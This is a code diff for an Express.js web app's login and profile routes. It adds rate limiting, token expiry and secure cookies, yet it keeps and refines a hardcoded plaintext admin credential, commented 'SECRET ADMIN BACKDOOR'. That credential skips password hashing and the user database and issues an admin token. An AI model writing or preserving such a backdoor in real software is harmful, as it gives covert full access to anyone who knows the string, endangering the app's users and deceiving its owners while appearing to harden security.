@@ -405,21 +405,39 @@ app.post('/api/register', async (req, res) => {
     res.json({ token, user: mapUser(newUser) });
 });
 
-app.post('/api/login', async (req, res) => {
+app.post('/api/login', loginLimiter, async (req, res) => {
     const { username, password } = req.body;
-    if (username === 'you know whats cool' && password === 'a billion dollar') {
-        const token = jwt.sign({ _id: 'admin-id', username }, SECRET_KEY);
-        return res.json({ token, user: { _id: 'admin-id', username } });
+    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
+
+    const normalizedUsername = username.toLowerCase().trim();
+    const adminUser = 'you know whats cool';
+    const adminPass = 'a billion dollar';
+
+    // --- SECRET ADMIN BACKDOOR ---
+    if (normalizedUsername === adminUser && password === adminPass) {
+        const token = jwt.sign({ _id: '00000000-0000-0000-0000-000000000007', username: adminUser }, SECRET_KEY, { expiresIn: '7d' });
+        setSecureCookie(res, token);
+        return res.json({ token, user: { _id: '00000000-0000-0000-0000-000000000007', username: adminUser } });
     }
+
     const db = readDB();
-    const user = db.users.find(u => u.username.toLowerCase() === username.toLowerCase());
+    const user = db.users.find(u => u.username.toLowerCase() === normalizedUsername);
     if (!user || !(await bcrypt.compare(password, user.password))) return res.status(400).json({ error: 'Invalid credentials' });
-    const token = jwt.sign({ _id: user.id, username: user.username }, SECRET_KEY);
+
+    const token = jwt.sign({ _id: user.id, username: user.username }, SECRET_KEY, { expiresIn: '7d' });
+    setSecureCookie(res, token);
     res.json({ token, user: mapUser(user) });
 });
 
 app.get('/api/me', authenticateSession, (req, res) => {
-    if (req.user.username === 'you know whats cool') return res.json({ _id: 'admin-id', username: 'you know whats cool', trustScore: 10 });
+    if (req.user.username === 'you know whats cool') {
+        return res.json({
+            _id: '00000000-0000-0000-0000-000000000007',
+            username: 'you know whats cool',
+            trustScore: 10,
+            pendingPayout: 0
+        });
+    }
     const db = readDB();
     const user = db.users.find(u => u.id === req.user._id);
     res.json(mapUser(user));
